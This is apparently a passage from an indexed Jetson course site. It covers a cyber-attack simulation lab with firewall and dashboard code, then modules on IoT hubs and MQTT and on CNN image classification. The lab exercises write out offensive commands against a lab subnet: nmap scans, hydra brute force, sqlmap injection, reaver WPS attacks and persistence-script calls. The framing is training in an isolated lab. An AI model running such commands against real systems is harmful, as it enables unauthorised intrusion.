172.20.0.0/16 -j ACCEPT',\n            # Rate limit SSH connections\n            'iptables -A INPUT -p tcp --dport 22 -m limit --limit 3/min -j ACCEPT',\n            # Drop all other SSH\n            'iptables -A INPUT -p tcp --dport 22 -j DROP',\n            # Allow HTTP/HTTPS\n            'iptables -A INPUT -p tcp --dport 80 -j ACCEPT',\n            'iptables -A INPUT -p tcp --dport 443 -j ACCEPT',\n            # Log dropped packets\n            'iptables -A INPUT -j LOG --log-prefix \"DROPPED: \"',\n            # Default drop\n            'iptables -A INPUT -j DROP'\n        ]\n\n        for rule in base_rules:\n            self.execute_rule(rule)\n\n    def block_ip_temporary(self, ip, duration_minutes=60):\n        \"\"\"Block IP temporarily\"\"\"\n        if ip in self.whitelist:\n            print(f\"[!] IP {ip} is whitelisted, not blocking\")\n            return\n\n        # Add to iptables\n        rule = f'iptables -I INPUT -s {ip} -j DROP'\n        self.execute_rule(rule)\n\n        self.blocked_ips.add(ip)\n        print(f\"[+] Blocked {ip} for {duration_minutes} minutes\")\n\n        # Schedule unblock (in real implementation, use proper scheduler)\n        # For demo, we'll just track it\n        unblock_time = datetime.now() + timedelta(minutes=duration_minutes)\n        print(f\"[+] {ip} will be unblocked at {unblock_time}\")\n\n    def execute_rule(self, rule):\n        \"\"\"Execute iptables rule\"\"\"\n        try:\n            subprocess.run(rule.split(), check=True)\n            self.rules.append(rule)\n            print(f\"[+] Executed: {rule}\")\n        except subprocess.CalledProcessError as e:\n            print(f\"[-] Failed to execute: {rule} - {e}\")\n\n    def get_blocked_ips(self):\n        \"\"\"Get list of currently blocked IPs\"\"\"\n        return list(self.blocked_ips)\n\n    def unblock_ip(self, ip):\n        \"\"\"Unblock IP address\"\"\"\n        rule = f'iptables -D INPUT -s {ip} -j DROP'\n        self.execute_rule(rule)\n        self.blocked_ips.discard(ip)\n        print(f\"[+] Unblocked {ip}\")\n\n# Usage\nfirewall = JetsonFirewall()\nfirewall.setup_base_rules()\n</code></pre></p> <p>\ud83d\udcca 3. Real-time Security Dashboard <pre><code># security_dashboard.py\nimport curses\nimport time\nimport threading\nimport json\nfrom datetime import datetime\n\nclass SecurityDashboard:\n    def __init__(self, monitor):\n        self.monitor = monitor\n        self.running = False\n\n    def start_dashboard(self):\n        \"\"\"Start the curses-based security dashboard\"\"\"\n        curses.wrapper(self.main_loop)\n\n    def main_loop(self, stdscr):\n        \"\"\"Main dashboard loop\"\"\"\n        self.running = True\n        curses.curs_set(0)  # Hide cursor\n        stdscr.nodelay(1)   # Non-blocking input\n\n        while self.running:\n            stdscr.clear()\n\n            # Header\n            stdscr.addstr(0, 0, \"\ud83d\udee1\ufe0f  JETSON SECURITY DASHBOARD\", curses.A_BOLD)\n            stdscr.addstr(1, 0, \"=\" * 60)\n\n            # System status\n            self.draw_system_status(stdscr, 3)\n\n            # Recent alerts\n            self.draw_recent_alerts(stdscr, 10)\n\n            # Network activity\n            self.draw_network_activity(stdscr, 20)\n\n            # Controls\n            stdscr.addstr(35, 0, \"Press 'q' to quit, 'r' to refresh\")\n\n            stdscr.refresh()\n\n            # Check for input\n            key = stdscr.getch()\n            if key == ord('q'):\n                self.running = False\n\n            time.sleep(1)\n\n    def draw_system_status(self, stdscr, start_row):\n        \"\"\"Draw system status section\"\"\"\n        stdscr.addstr(start_row, 0, \"\ud83d\udcca SYSTEM STATUS:\", curses.A_BOLD)\n\n        import psutil\n        cpu_percent = psutil.cpu_percent()\n        memory = psutil.virtual_memory()\n\n        stdscr.addstr(start_row + 1, 2, f\"CPU Usage: {cpu_percent:.1f}%\")\n        stdscr.addstr(start_row + 2, 2, f\"Memory Usage: {memory.percent:.1f}%\")\n        stdscr.addstr(start_row + 3, 2, f\"Active Connections: {len(psutil.net_connections())}\")\n        stdscr.addstr(start_row + 4, 2, f\"Monitoring Status: {'\ud83d\udfe2 ACTIVE' if self.monitor.monitoring else '\ud83d\udd34 INACTIVE'}\")\n\n    def draw_recent_alerts(self, stdscr, start_row):\n        \"\"\"Draw recent alerts section\"\"\"\n        stdscr.addstr(start_row, 0, \"\ud83d\udea8 RECENT ALERTS:\", curses.A_BOLD)\n\n        recent_alerts = self.monitor.alerts[-8:] if self.monitor.alerts else []\n\n        for i, alert in enumerate(recent_alerts):\n            severity_color = curses.A_NORMAL\n            if alert['severity'] == 'critical':\n                severity_color = curses.A_REVERSE\n            elif alert['severity'] == 'high':\n                severity_color = curses.A_BOLD\n\n            alert_text = f\"{alert['timestamp'][:19]} - {alert['type'].upper()}: {alert['message'][:40]}...\"\n            stdscr.addstr(start_row + 1 + i, 2, alert_text, severity_color)\n\n    def draw_network_activity(self, stdscr, start_row):\n        \"\"\"Draw network activity section\"\"\"\n        stdscr.addstr(start_row, 0, \"\ud83c\udf10 NETWORK ACTIVITY:\", curses.A_BOLD)\n\n        # This would show real network stats\n        stdscr.addstr(start_row + 1, 2, \"Active monitoring of network traffic...\")\n        stdscr.addstr(start_row + 2, 2, f\"Packets analyzed: {len(self.monitor.alerts) * 100}\")\n        stdscr.addstr(start_row + 3, 2, f\"Threats detected: {len([a for a in self.monitor.alerts if a['severity'] in ['high', 'critical']])}\")\n\n# Usage with the security monitor\n# dashboard = SecurityDashboard(monitor)\n# dashboard.start_dashboard()\n</code></pre></p> <p>\u2e3b</p> <p>\ud83e\uddea Comprehensive Security Lab Exercises</p>"},{"location":"curriculum/my_03d_linux_cyber_attack_simulation/#lab-1-advanced-reconnaissance-enumeration","title":"Lab 1: Advanced Reconnaissance &amp; Enumeration","text":"<p>\ud83c\udfaf Objectives: - Master advanced network reconnaissance techniques - Practice IoT device fingerprinting - Understand attack surface analysis</p> <p>\ud83d\udee0\ufe0f Tasks: 1. Network Discovery <pre><code># From attacker container\nnmap -sn 172.20.0.0/16  # Host discovery\nnmap -sS -sV -O 172.20.0.10  # Service detection\nnmap --script vuln 172.20.0.10  # Vulnerability scanning\n</code></pre></p> <ol> <li> <p>Service Enumeration <pre><code># Web service enumeration\ngobuster dir -u http://172.20.0.10 -w /usr/share/wordlists/dirb/common.txt\nnikto -h http://172.20.0.10\n\n# SSH enumeration\nssh-audit 172.20.0.10\n\n# SMB enumeration (if available)\nenum4linux 172.20.0.10\n</code></pre></p> </li> <li> <p>IoT Device Fingerprinting <pre><code># Run the IoT scanner\npython3 iot_scanner.py\n\n# Analyze results\ncat iot_scan_results.json | jq '.[] | select(.vulnerabilities | length &gt; 0)'\n</code></pre></p> </li> </ol> <p>\ud83d\udccb Deliverables: - Network topology diagram - Service enumeration report - IoT vulnerability assessment</p>"},{"location":"curriculum/my_03d_linux_cyber_attack_simulation/#lab-2-multi-vector-attack-simulation","title":"Lab 2: Multi-Vector Attack Simulation","text":"<p>\ud83c\udfaf Objectives: - Execute coordinated attack campaigns - Practice persistence techniques - Understand lateral movement</p> <p>\ud83d\udee0\ufe0f Tasks: 1. Credential Attacks <pre><code># Create custom wordlists\ncewl http://172.20.0.10 -w custom_wordlist.txt\n\n# Multi-service brute force\nhydra -L users.txt -P passwords.txt ssh://172.20.0.10\nhydra -L users.txt -P passwords.txt ftp://172.20.0.10\n</code></pre></p> <ol> <li> <p>Web Application Attacks <pre><code># SQL injection\nsqlmap -u \"http://172.20.0.10/login.php\" --forms --batch\n\n# Command injection\npython3 web_exploit.py --target http://172.20.0.10\n</code></pre></p> </li> <li> <p>Post-Exploitation <pre><code># Run APT simulator\npython3 apt_simulator.py\n\n# Establish persistence\npython3 persistence_toolkit.py --target 172.20.0.10\n</code></pre></p> </li> </ol> <p>\ud83d\udccb Deliverables: - Attack timeline documentation - Persistence mechanisms report - Data exfiltration evidence</p>"},{"location":"curriculum/my_03d_linux_cyber_attack_simulation/#lab-3-advanced-defense-implementation","title":"Lab 3: Advanced Defense Implementation","text":"<p>\ud83c\udfaf Objectives: - Deploy automated threat detection - Implement incident response procedures - Practice forensic analysis</p> <p>\ud83d\udee0\ufe0f Tasks: 1. Deploy Security Monitoring <pre><code># From defender container\npython3 security_monitor.py &amp;\n\n# Start advanced firewall\npython3 advanced_firewall.py\n\n# Launch security dashboard\npython3 security_dashboard.py\n</code></pre></p> <ol> <li> <p>Incident Response Simulation <pre><code># Simulate attack detection\n# Monitor alerts in real-time\n# Practice containment procedures\n</code></pre></p> </li> <li> <p>Forensic Analysis <pre><code># Analyze attack artifacts\ngrep \"DROPPED\" /var/log/syslog\n\n# Network forensics\ntcpdump -r attack_capture.pcap -nn\n\n# Memory analysis (if available)\nvolatility -f memory_dump.raw imageinfo\n</code></pre></p> </li> </ol> <p>\ud83d\udccb Deliverables: - Security monitoring configuration - Incident response playbook - Forensic analysis report</p>"},{"location":"curriculum/my_03d_linux_cyber_attack_simulation/#lab-4-iot-security-assessment","title":"Lab 4: IoT Security Assessment","text":"<p>\ud83c\udfaf Objectives: - Assess IoT device security - Understand firmware analysis - Practice wireless security testing</p> <p>\ud83d\udee0\ufe0f Tasks: 1. Device Security Assessment <pre><code># IoT security scanner\nfrom iot_security_scanner import IoTScanner\n\nscanner = IoTScanner('172.20.0.0/16')\nresults = scanner.comprehensive_scan()\nscanner.generate_report(results)\n</code></pre></p> <ol> <li> <p>Firmware Analysis (Simulated)    <pre><code># Extract firmware (simulated)\nbinwalk firmware.bin\n\n# Analyze for vulnerabilities\nfirmwalker firmware_extracted/\n</code></pre></p> </li> <li> <p>Wireless Security Testing <pre><code># WiFi reconnaissance\nairodump-ng wlan0mon\n\n# WPS testing\nreaver -i wlan0mon -b [BSSID] -vv\n</code></pre></p> </li> </ol> <p>\ud83d\udccb Deliverables: - IoT security assessment report - Firmware vulnerability analysis - Wireless security evaluation</p>"},{"location":"curriculum/my_03d_linux_cyber_attack_simulation/#lab-5-red-team-vs-blue-team-exercise","title":"Lab 5: Red Team vs Blue Team Exercise","text":"<p>\ud83c\udfaf Objectives: - Conduct realistic attack/defense scenarios - Practice team coordination - Evaluate security effectiveness</p> <p>\ud83d\udee0\ufe0f Scenario: - Red Team: Attempt to compromise target systems - Blue Team: Detect and respond to attacks - Duration: 4 hours</p> <p>\ud83d\udcca Evaluation Criteria: - Attack success rate - Detection time - Response effectiveness - Documentation quality</p>"},{"location":"curriculum/my_03d_linux_cyber_attack_simulation/#final-challenge-comprehensive-security-assessment","title":"\ud83c\udf93 Final Challenge: Comprehensive Security Assessment","text":"<p>\ud83c\udfaf Objective: Conduct a complete security assessment of a simulated Jetson IoT environment.</p> <p>\ud83d\udee0\ufe0f Requirements: 1. Reconnaissance Phase (30 minutes)    - Network discovery and mapping    - Service enumeration    - Vulnerability identification</p> <ol> <li>Exploitation Phase (60 minutes)</li> <li>Exploit identified vulnerabilities</li> <li>Establish persistence</li> <li> <p>Demonstrate impact</p> </li> <li> <p>Defense Phase (45 minutes)</p> </li> <li>Deploy monitoring systems</li> <li>Implement security controls</li> <li> <p>Create incident response procedures</p> </li> <li> <p>Reporting Phase (45 minutes)</p> </li> <li>Document findings</li> <li>Provide remediation recommendations</li> <li>Present to stakeholders</li> </ol> <p>\ud83d\udccb Final Deliverables: - Executive summary - Technical vulnerability report - Security architecture recommendations - Incident response playbook - Security monitoring dashboard</p>"},{"location":"curriculum/my_03d_linux_cyber_attack_simulation/#security-lab-guidelines","title":"\ud83d\udd12 Security Lab Guidelines","text":"<p>\u26a0\ufe0f Critical Safety Rules: 1. Isolation: All activities must be conducted in isolated lab environment 2. Authorization: Only attack systems you own or have explicit permission to test 3. Documentation: Maintain detailed logs of all activities 4. Cleanup: Remove all attack tools and artifacts after exercises 5. Responsible Disclosure: Report any real vulnerabilities found through proper channels</p> <p>\ud83d\udee1\ufe0f Ethical Considerations: - These skills are for defensive purposes only - Never use techniques against unauthorized systems - Respect privacy and confidentiality - Follow applicable laws and regulations - Maintain professional integrity</p> <p>\ud83d\udcda Additional Resources: - OWASP IoT Security Testing Guide - NIST Cybersecurity Framework - SANS Incident Response Methodology - CVE Database for vulnerability research - Jetson Security Best Practices Documentation</p>"},{"location":"curriculum/my_03e_jetson_iot_hub_integration/","title":"\ud83c\udf10 Using Jetson as an IoT Hub: Integration with Alexa, MQTT, and Cloud","text":"<p>NVIDIA Jetson is more than an AI edge device\u2014it can serve as a powerful IoT gateway, interfacing with local sensors, cloud platforms, and even voice assistants like Amazon Alexa. In this module, students will explore how Jetson can:</p> <ul> <li>Receive sensor input and perform local inference</li> <li>Interact with cloud services like AWS IoT Core</li> <li>Use MQTT to send/receive data</li> <li>Trigger or respond to Alexa voice commands</li> </ul>"},{"location":"curriculum/my_03e_jetson_iot_hub_integration/#what-is-an-iot-hub","title":"\ud83e\udde9 What is an IoT Hub?","text":"<p>An IoT Hub is a bridge between:</p> <ul> <li>Local edge devices (cameras, sensors)</li> <li>Cloud systems (databases, dashboards)</li> <li>Control interfaces (apps, voice assistants)</li> </ul> <p>Jetson is ideal as an IoT Hub due to its:</p> <ul> <li>On-device GPU for AI processing</li> <li>Linux flexibility for integration</li> <li>Networking support (Wi-Fi, Ethernet, Bluetooth)</li> </ul>"},{"location":"curriculum/my_03e_jetson_iot_hub_integration/#iot-communication-protocols","title":"\ud83d\udd0c IoT Communication Protocols","text":""},{"location":"curriculum/my_03e_jetson_iot_hub_integration/#mqtt-message-queuing-telemetry-transport","title":"MQTT (Message Queuing Telemetry Transport)","text":"<ul> <li>Lightweight pub-sub messaging protocol</li> <li>Used for sensor data, control messages</li> </ul> <pre><code>sudo apt install mosquitto mosquitto-clients\n</code></pre> <p>Test with:</p> <pre><code>mosquitto_sub -t test/topic &amp;\nmosquitto_pub -t test/topic -m \"Hello from Jetson\"\n</code></pre>"},{"location":"curriculum/my_03e_jetson_iot_hub_integration/#httprest","title":"HTTP/REST","text":"<ul> <li>Used to call web APIs (e.g., AWS Lambda, IFTTT)</li> </ul>"},{"location":"curriculum/my_03e_jetson_iot_hub_integration/#ble-bluetooth-low-energy","title":"BLE (Bluetooth Low Energy)","text":"<ul> <li>Communicate with smart devices and sensors</li> <li>Use <code>bluetoothctl</code>, <code>bluez</code>, or <code>bleak</code> in Python</li> </ul>"},{"location":"curriculum/my_03e_jetson_iot_hub_integration/#connect-jetson-to-amazon-iot-core","title":"\u2601\ufe0f Connect Jetson to Amazon IoT Core","text":""},{"location":"curriculum/my_03e_jetson_iot_hub_integration/#prerequisites","title":"Prerequisites","text":"<ul> <li>AWS account</li> <li>Create IoT Thing, certificate, and download keys</li> <li>Install SDK:</li> </ul> <pre><code>pip install AWSIoTPythonSDK\n</code></pre>"},{"location":"curriculum/my_03e_jetson_iot_hub_integration/#sample-jetson-mqtt-publisher-python","title":"Sample Jetson MQTT Publisher (Python)","text":"<pre><code>from AWSIoTPythonSDK.MQTTLib import AWSIoTMQTTClient\n\nclient = AWSIoTMQTTClient(\"jetson\")\nclient.configureEndpoint(\"YOUR-ENDPOINT.amazonaws.com\", 8883)\nclient.configureCredentials(\"root-ca.pem\", \"private.key\", \"cert.pem\")\n\nclient.connect()\nclient.publish(\"jetson/topic\", \"{\\\"temp\\\": 21.5}\", 1)\n</code></pre>"},{"location":"curriculum/my_03e_jetson_iot_hub_integration/#voice-assistant-integration-alexa-jetson","title":"\ud83d\udde3\ufe0f Voice Assistant Integration: Alexa + Jetson","text":"<p>You can trigger Jetson code via Alexa using:</p> <ul> <li>Alexa Smart Home Skill</li> <li>Alexa Routine + AWS Lambda + IoT MQTT trigger</li> <li>Local Flask REST server + IFTTT/Alexa HTTP Webhook</li> </ul>"},{"location":"curriculum/my_03e_jetson_iot_hub_integration/#lab-idea-alexa-turn-on-object-detector","title":"Lab Idea: Alexa Turn-On Object Detector","text":"<ol> <li>Create Alexa Routine \u2192 Call IFTTT webhook</li> <li>Webhook hits Jetson Flask server</li> <li>Jetson launches YOLO inference and streams result</li> </ol>"},{"location":"curriculum/my_03e_jetson_iot_hub_integration/#lab-exercise-jetson-as-mqtt-alexa-hub","title":"\ud83e\uddea Lab Exercise: Jetson as MQTT + Alexa Hub","text":"<ol> <li>Install Mosquitto MQTT broker on Jetson</li> <li>Simulate local sensor (e.g., DHT11) sending data via MQTT</li> <li>Send data to AWS IoT dashboard</li> <li>Control LED (or software switch) from Alexa command</li> </ol> <p>Bonus:</p> <ul> <li>Build an AI voice assistant using Jetson + Whisper + LLM</li> </ul>"},{"location":"curriculum/my_03e_jetson_iot_hub_integration/#summary","title":"\ud83e\udde0 Summary","text":"Feature Example MQTT Pub/Sub Jetson to AWS IoT or Node-RED Alexa Routine Trigger Starts object detection script BLE Device Discovery Scans smart sensors, tags Cloud Visualization AWS IoT Core Dashboard <p>Jetson becomes the edge AI brain of the smart environment.</p> <p>Next: Extend this project by adding LangChain-based LLM logic to respond to sensor inputs or voice context.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/","title":"My 05 cnn image processing jetson","text":"<p>\ud83e\udde0 Deep Learning &amp; CNNs for Image Classification on Jetson</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#learning-objectives","title":"\ud83c\udfaf Learning Objectives","text":"<p>By the end of this tutorial, you will: - Understand deep learning fundamentals and CNN architecture - Implement basic and advanced CNN models using the Jetson CNN Toolkit - Optimize CNN inference on Jetson devices using various techniques - Deploy production-ready image classification systems</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#deep-learning-theoretical-foundations","title":"\ud83e\udde0 Deep Learning Theoretical Foundations","text":""},{"location":"curriculum/my_05_cnn_image_processing_jetson/#what-is-deep-learning","title":"What is Deep Learning?","text":"<p>Deep learning is a subset of machine learning that uses artificial neural networks with multiple layers (hence \"deep\") to model and understand complex patterns in data. For image classification, deep learning has revolutionized computer vision by automatically learning hierarchical feature representations.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#key-concepts","title":"Key Concepts","text":""},{"location":"curriculum/my_05_cnn_image_processing_jetson/#1-neural-network-basics","title":"1. Neural Network Basics","text":"<ul> <li>Neuron: Basic computational unit that applies weights, bias, and activation function</li> <li>Layer: Collection of neurons that process input simultaneously</li> <li>Forward Propagation: Data flows from input to output through layers</li> <li>Backpropagation: Error flows backward to update weights during training</li> </ul>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#2-deep-learning-vs-traditional-ml","title":"2. Deep Learning vs Traditional ML","text":"Aspect Traditional ML Deep Learning Feature Engineering Manual feature extraction Automatic feature learning Data Requirements Works with small datasets Requires large datasets Computational Cost Lower Higher Performance Good for simple patterns Excellent for complex patterns Interpretability Higher Lower (black box)"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#3-why-deep-learning-for-images","title":"3. Why Deep Learning for Images?","text":"<ul> <li>Hierarchical Learning: Lower layers detect edges, higher layers detect objects</li> <li>Translation Invariance: Can recognize objects regardless of position</li> <li>Scale Invariance: Can handle objects of different sizes</li> <li>Robustness: Handles variations in lighting, rotation, and occlusion</li> </ul>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#mathematical-foundations","title":"Mathematical Foundations","text":""},{"location":"curriculum/my_05_cnn_image_processing_jetson/#convolution-operation","title":"Convolution Operation","text":"<p>The convolution operation is fundamental to CNNs. It involves sliding a filter (kernel) across an input image to detect features. The mathematical representation is:</p> <p>Output[i,j] = \u03a3 \u03a3 Input[i+m, j+n] * Kernel[m,n]</p> <p>The Jetson CNN Toolkit includes a demonstration of 2D convolution operations for educational purposes, showing how edge detection kernels work on sample images.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#activation-functions","title":"Activation Functions","text":"<p>Activation functions introduce non-linearity into neural networks, enabling them to learn complex patterns:</p> <ul> <li>ReLU (Rectified Linear Unit): f(x) = max(0, x) - Most commonly used</li> <li>Sigmoid: f(x) = 1/(1+e^(-x)) - Outputs between 0 and 1</li> <li>Tanh: f(x) = tanh(x) - Outputs between -1 and 1</li> <li>Leaky ReLU: f(x) = max(0.01x, x) - Prevents dying ReLU problem</li> </ul> <p>The toolkit includes visualization capabilities for comparing different activation functions and their characteristics.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#cnn-architecture-deep-dive","title":"\ud83c\udfd7\ufe0f CNN Architecture Deep Dive","text":""},{"location":"curriculum/my_05_cnn_image_processing_jetson/#convolutional-neural-networks-cnns","title":"Convolutional Neural Networks (CNNs)","text":"<p>CNNs are specialized deep neural networks designed for processing grid-like data such as images. They use convolution operations to detect local features and build hierarchical representations.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#cnn-layer-types","title":"CNN Layer Types","text":""},{"location":"curriculum/my_05_cnn_image_processing_jetson/#1-convolutional-layer","title":"1. Convolutional Layer","text":"<ul> <li>Purpose: Feature extraction using learnable filters</li> <li>Parameters: Filter size, stride, padding, number of filters</li> <li>Output: Feature maps highlighting detected patterns</li> </ul>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#2-activation-layer","title":"2. Activation Layer","text":"<ul> <li>Purpose: Introduce non-linearity</li> <li>Common: ReLU, Leaky ReLU, ELU</li> <li>Effect: Enables learning of complex patterns</li> </ul>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#3-pooling-layer","title":"3. Pooling Layer","text":"<ul> <li>Purpose: Spatial downsampling and translation invariance</li> <li>Types: Max pooling, Average pooling, Global pooling</li> <li>Benefits: Reduces computational cost and overfitting</li> </ul>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#4-normalization-layer","title":"4. Normalization Layer","text":"<ul> <li>Purpose: Stabilize training and improve convergence</li> <li>Types: Batch Normalization, Layer Normalization, Group Normalization</li> <li>Benefits: Faster training, better generalization</li> </ul>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#5-fully-connected-layer","title":"5. Fully Connected Layer","text":"<ul> <li>Purpose: Final classification or regression</li> <li>Position: Usually at the end of the network</li> <li>Function: Maps features to output classes</li> </ul>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#cnn-architecture-implementation","title":"CNN Architecture Implementation","text":"<p>The Jetson CNN Toolkit provides a comprehensive <code>BasicCNN</code> class that demonstrates proper CNN architecture design:</p> <ul> <li>Feature Extraction Layers: Three convolutional blocks with increasing channel depth (32\u219264\u2192128)</li> <li>Batch Normalization: Applied after each convolution for training stability</li> <li>Pooling Strategy: Max pooling for spatial downsampling, adaptive pooling for variable input sizes</li> <li>Classification Head: Fully connected layers with dropout for regularization</li> </ul> <p>The toolkit's <code>BasicCNN</code> implementation supports configurable input channels and output classes, making it suitable for various image classification tasks from CIFAR-10 to ImageNet-scale problems.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#cnn-implementation-with-jetson-toolkit","title":"\ud83d\udcbb CNN Implementation with Jetson Toolkit","text":""},{"location":"curriculum/my_05_cnn_image_processing_jetson/#cifar-10-classification-example","title":"CIFAR-10 Classification Example","text":"<p>The Jetson CNN Toolkit provides a comprehensive implementation for image classification tasks. The toolkit includes several CNN architectures optimized for NVIDIA Jetson devices.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#basic-cnn-architecture","title":"Basic CNN Architecture","text":"<p>The toolkit's <code>BasicCNN</code> class demonstrates a well-structured CNN design:</p> <ul> <li>Convolutional Blocks: Three sequential blocks with increasing feature depth (32\u219264\u2192128 channels)</li> <li>Batch Normalization: Applied after each convolution for training stability</li> <li>Pooling Strategy: Max pooling for spatial downsampling</li> <li>Classification Head: Fully connected layers with dropout regularization</li> <li>Adaptive Design: Supports variable input sizes through adaptive pooling</li> </ul>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#data-preparation-and-augmentation","title":"Data Preparation and Augmentation","text":"<p>The Jetson CNN Toolkit includes comprehensive data handling capabilities:</p> <ul> <li>Dataset Support: CIFAR-10, ImageNet, and custom datasets</li> <li>Data Augmentation: Random horizontal flip, rotation, color jittering, and normalization</li> <li>Efficient Loading: Optimized data loaders with configurable batch sizes and worker processes</li> <li>Preprocessing Pipeline: Automatic image preprocessing with dataset-specific normalization values</li> </ul>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#training-pipeline","title":"Training Pipeline","text":"<p>The Jetson CNN Toolkit provides a comprehensive training system:</p> <ul> <li>Optimizer Support: Adam, SGD, and other optimizers with configurable learning rates</li> <li>Loss Functions: Cross-entropy, focal loss, and custom loss implementations</li> <li>Learning Rate Scheduling: Step decay, cosine annealing, and adaptive scheduling</li> <li>Training Monitoring: Real-time loss and accuracy tracking with progress visualization</li> <li>Validation: Automatic validation during training with early stopping capabilities</li> <li>Device Management: Automatic GPU/CPU detection and memory optimization for Jetson devices</li> </ul>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#visualization-and-monitoring","title":"Visualization and Monitoring","text":"<p>The toolkit includes comprehensive visualization capabilities:</p> <ul> <li>Training Curves: Real-time plotting of loss and accuracy metrics</li> <li>Performance Metrics: Detailed accuracy, precision, recall, and F1-score tracking</li> <li>Model Visualization: Architecture diagrams and feature map visualization</li> <li>Export Options: Save training history and model checkpoints automatically</li> </ul>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#usage-example","title":"Usage Example","text":"<p>The Jetson CNN Toolkit provides a simple command-line interface for training:</p> <pre><code># Train a BasicCNN on CIFAR-10\npython jetson_cnn_toolkit.py --mode train --model BasicCNN --dataset cifar10 --epochs 20\n\n# Train with custom parameters\npython jetson_cnn_toolkit.py --mode train --model CustomResNet --dataset imagenet --batch-size 64 --lr 0.001\n</code></pre>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#advanced-cnn-architectures","title":"\ud83c\udfdb\ufe0f Advanced CNN Architectures","text":""},{"location":"curriculum/my_05_cnn_image_processing_jetson/#resnet-residual-networks","title":"ResNet (Residual Networks)","text":"<p>ResNet introduced skip connections to solve the vanishing gradient problem in deep networks.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#key-resnet-components","title":"Key ResNet Components","text":"<p>Residual Blocks: The fundamental building blocks that implement skip connections, allowing gradients to flow directly through the network during backpropagation.</p> <p>Skip Connections: Direct pathways that add the input to the output of a block, enabling identity mapping and solving the degradation problem in deep networks.</p> <p>Bottleneck Design: Efficient architecture using 1x1 convolutions to reduce computational complexity while maintaining representational power.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#custom-resnet-implementation","title":"Custom ResNet Implementation","text":"<p>The Jetson CNN Toolkit includes a <code>CustomResNet</code> class optimized for edge deployment:</p> <ul> <li>Modular Design: Built using <code>ResidualBlock</code> components for easy customization</li> <li>Configurable Depth: Supports different layer configurations (ResNet-18, ResNet-34, etc.)</li> <li>Jetson Optimization: Memory-efficient implementation suitable for embedded deployment</li> <li>Skip Connection Handling: Automatic dimension matching for different stride and channel configurations</li> </ul> <p>The implementation demonstrates proper residual learning with batch normalization, ReLU activations, and adaptive pooling for variable input sizes.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#mobilenet-efficient-cnn-for-mobile-devices","title":"MobileNet - Efficient CNN for Mobile Devices","text":"<p>MobileNet uses depthwise separable convolutions to reduce computational cost while maintaining accuracy.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#key-mobilenet-features","title":"Key MobileNet Features","text":"<p>Depthwise Separable Convolutions: Split standard convolutions into depthwise and pointwise operations, dramatically reducing computational cost.</p> <p>Width Multiplier: Allows scaling the network size by adjusting the number of channels, enabling deployment on resource-constrained devices.</p> <p>Efficient Architecture: Designed specifically for mobile and embedded applications with minimal accuracy loss.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#mobilenet-in-jetson-toolkit","title":"MobileNet in Jetson Toolkit","text":"<p>The toolkit includes an optimized MobileNet implementation:</p> <ul> <li>Jetson-Optimized: Configured with appropriate width multipliers for different Jetson models</li> <li>Depthwise Separable Blocks: Efficient implementation of the core MobileNet building blocks</li> <li>Flexible Scaling: Configurable width multipliers (0.25, 0.5, 0.75, 1.0) for different performance requirements</li> <li>Memory Efficient: Optimized for Jetson's memory constraints while maintaining inference speed</li> </ul>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#efficientnet-compound-scaling","title":"EfficientNet - Compound Scaling","text":"<p>EfficientNet uses compound scaling to balance network depth, width, and resolution for optimal efficiency.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#key-efficientnet-innovations","title":"Key EfficientNet Innovations","text":"<p>Compound Scaling: Systematically scales network depth, width, and resolution using a compound coefficient, achieving better accuracy-efficiency trade-offs.</p> <p>Mobile Inverted Bottleneck (MBConv): Advanced building blocks that combine inverted residuals, depthwise convolutions, and squeeze-and-excitation modules.</p> <p>Neural Architecture Search (NAS): The base architecture was discovered through automated search, optimizing for both accuracy and efficiency.</p> <p>Squeeze-and-Excitation: Attention mechanism that adaptively recalibrates channel-wise feature responses.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#efficientnet-in-jetson-toolkit","title":"EfficientNet in Jetson Toolkit","text":"<p>The toolkit provides EfficientNet variants optimized for Jetson deployment:</p> <ul> <li>Jetson-Tuned Scaling: Pre-configured compound coefficients optimized for different Jetson models</li> <li>MBConv Blocks: Efficient implementation of mobile inverted bottleneck convolutions</li> <li>Memory Optimization: Reduced precision and optimized memory access patterns</li> <li>Flexible Variants: Support for EfficientNet-B0 through B7 with Jetson-specific modifications</li> <li>SE Module Integration: Optimized squeeze-and-excitation implementation for edge devices</li> </ul>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#jetson-specific-optimizations","title":"\u2699\ufe0f Jetson-Specific Optimizations","text":""},{"location":"curriculum/my_05_cnn_image_processing_jetson/#1-memory-management-for-jetson","title":"1. Memory Management for Jetson","text":"<p>Efficient memory management is crucial for optimal performance on resource-constrained Jetson devices.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#memory-optimization-features-in-jetson-toolkit","title":"Memory Optimization Features in Jetson Toolkit","text":"<p>System Memory Monitoring: Real-time tracking of system RAM usage, available memory, and memory pressure indicators to prevent out-of-memory conditions.</p> <p>GPU Memory Management: Comprehensive 